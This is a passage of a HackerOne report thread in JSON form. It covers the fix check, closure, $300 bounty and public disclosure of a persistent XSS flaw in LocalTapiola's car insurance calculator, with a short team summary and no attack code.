happens.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-01T20:43:44.464Z","updated_at":"2016-06-01T20:43:44.464Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1026464,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, this could be retested by you - we have now verified the fix. Please do not that the fix is limited in a sense: spoofed content can still be included in a saved form but malicious content is filtered.","markdown_message":"\u003cp\u003eHi, this could be retested by you - we have now verified the fix. Please do not that the fix is limited in a sense: spoofed content can still be included in a saved form but malicious content is filtered.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-21T13:37:27.170Z","updated_at":"2016-06-21T13:37:27.170Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1027036,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\nI can now confirm this is fixed, I'm not able to inject additional nodes to the JSON, great!\n\nRegards,\nFrans","markdown_message":"\u003cp\u003eHi,\u003cbr\u003e\nI can now confirm this is fixed, I\u0026#39;m not able to inject additional nodes to the JSON, great!\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nFrans\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-21T19:07:16.470Z","updated_at":"2016-06-21T19:07:16.470Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1041878,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Closing as resolved. Thank you for the well-written report.","markdown_message":"\u003cp\u003eClosing as resolved. Thank you for the well-written report.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-27T22:25:41.396Z","updated_at":"2016-06-27T22:25:41.396Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"fransrosen","url":"/fransrosen"},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1041882,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-27T22:26:00.863Z","updated_at":"2016-06-27T22:26:00.863Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"LocalTapiola"}},"bounty_amount":"300.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"localtapiola","collaborator":{"username":"fransrosen","url":"/fransrosen"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1041884,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-27T22:26:59.474Z","updated_at":"2016-06-27T22:26:59.474Z","first_to_agree":true,"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1041888,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-27T22:32:08.397Z","updated_at":"2016-06-27T22:32:08.397Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1041889,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-27T22:32:08.494Z","updated_at":"2016-06-27T22:32:08.494Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":2136,"category":"team","content":"##Issue\n\nThe reporter found a flaw in the way JSON data was being handled in the car insurance calculator. There was a verified bug in a 3rd party library, namely React, that was vulnerable. The reporter was able to successfully exploit the flaw and create a persistent XSS. \n\n##Fix\nThe React library was patched.\n\n##Reasoning\nThe severity of the bug was classified as medium as the risk for personal data leak was minimal to nonexistent but the result of the vulnerability was persistent. Exploiting in a real-life scenario still required some way of tricking (e.g. phishing) the user into clicking a specific link. ","can_view?":true,"can_edit?":false,"content_html":"\u003ch2 id=\"issue\"\u003eIssue\u003c/h2\u003e\n\n\u003cp\u003eThe reporter found a flaw in the way JSON data was being handled in the car insurance calculator. There was a verified bug in a 3rd party library, namely React, that was vulnerable. The reporter was able to successfully exploit the flaw and create a persistent XSS. \u003c/p\u003e\n\n\u003ch2 id=\"fix\"\u003eFix\u003c/h2\u003e\n\n\u003cp\u003eThe React library was patched.\u003c/p\u003e\n\n\u003ch2 id=\"reasoning\"\u003eReasoning\u003c/h2\u003e\n\n\u003cp\u003eThe severity of the bug was classified as medium as the risk for personal data leak was minimal to nonexistent but the result of the vulnerability was persistent. Exploiting in a real-life scenario still required some way of tricking (e.g. phishing) the user into clicking a specific link. \u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}